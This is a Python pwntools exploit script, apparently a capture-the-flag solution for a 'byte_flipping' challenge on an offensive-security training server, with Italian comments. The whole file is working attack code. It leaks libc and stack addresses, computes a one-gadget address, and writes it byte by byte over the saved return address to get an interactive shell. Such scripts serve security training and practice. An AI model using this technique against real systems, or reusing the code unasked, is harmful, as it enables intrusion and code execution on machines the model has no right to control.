from pwn import *
import time
context.update(arch='amd64', os='linux')
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'
if "REMOTE" not in args:
    p = process("./byte_flipping")
    gdb.attach(p, """
        #b *0x400ac8
        """)
    input("wait")
else:
    p = remote("bin.training.offdef.it", 4003)


def addressvalue(add, value):
    p.sendline(add)
    time.sleep(0.1)
    p.sendline(value)
    time.sleep(0.1)

def name(name):
    p.sendline(name)
    time.sleep(0.1)
  


p.recvuntil(b"What's your name: ")
name(b"8"*7)
p.recvuntil(b"Good luck 8888888\n")
leaked_stack = b"\x00\x00" + p.recv(6)
leaked=u64(leaked_stack)
while leaked & 0xFF == 0:
    leaked >>= 8
formatted_leaked = "0x{:x}".format(leaked)
print("!!!Leaked_libc", formatted_leaked)
libc_base = hex(int(formatted_leaked, 16) - 0x81765)
print("!!!Libc_base", libc_base)

onegadget=hex(int(libc_base, 16)+0xebdb3)
print("!!!addr_gadget", onegadget)

byte_3 = bytes.fromhex(onegadget[8:10])
byte_2= bytes.fromhex(onegadget[6:8])
byte_1= bytes.fromhex(onegadget[4:6])
byte_0= bytes.fromhex(onegadget[2:4])
print("byte_0 ", byte_0)
print("byte_1 ", byte_1)
print("byte_2 ", byte_2)
print("byte_3 ", byte_3)
pause()

p.recvuntil(b"Address: ")

addressvalue(b"602068", b"6")

p.recvuntil(b"Address: ")

addressvalue(b"602050" ,b"e0")           #faccio ripartire play

p.recvuntil(b"Address: ")

addressvalue(b"602050" ,b"256")

p.recvuntil(b"What's your name: ")
name(b"0"*23)
p.recvuntil(b"Good luck 00000000000000000000000\n")
leaked_stack = b"\x00\x00" + p.recv(6)
leaked=u64(leaked_stack)
while leaked & 0xFF == 0:
    leaked >>= 8
formatted_leaked = "0x{:x}".format(leaked)
print("!!!Leaked_stack", formatted_leaked)
ret= hex(int(formatted_leaked, 16) -0x8)
ret1=hex(int(formatted_leaked, 16) -0x7)
ret2=hex(int(formatted_leaked, 16) -0x6)
ret3=hex(int(formatted_leaked, 16) -0x5)
ret4=hex(int(formatted_leaked, 16) -0x4)
ret5=hex(int(formatted_leaked, 16) -0x3)

pause()
p.recvuntil(b"Address: ")

addressvalue(ret , b"b3")

p.recvuntil(b"Address: ")

addressvalue(ret1 ,b"bd")

p.recvuntil(b"Address: ")

addressvalue(ret2, byte_3.hex())

p.recvuntil(b"Address: ")

addressvalue(ret3 , byte_2.hex())

p.recvuntil(b"Address: ")

addressvalue(ret4, byte_1.hex())

p.recvuntil(b"Address: ")

addressvalue(ret5 , byte_0.hex())


p.interactive()



#buffer 0x7fffffffde60
#name 0x6020a0
#counter 0x7fffffffde7c non interessante 
#rip play 0x7fffffffde98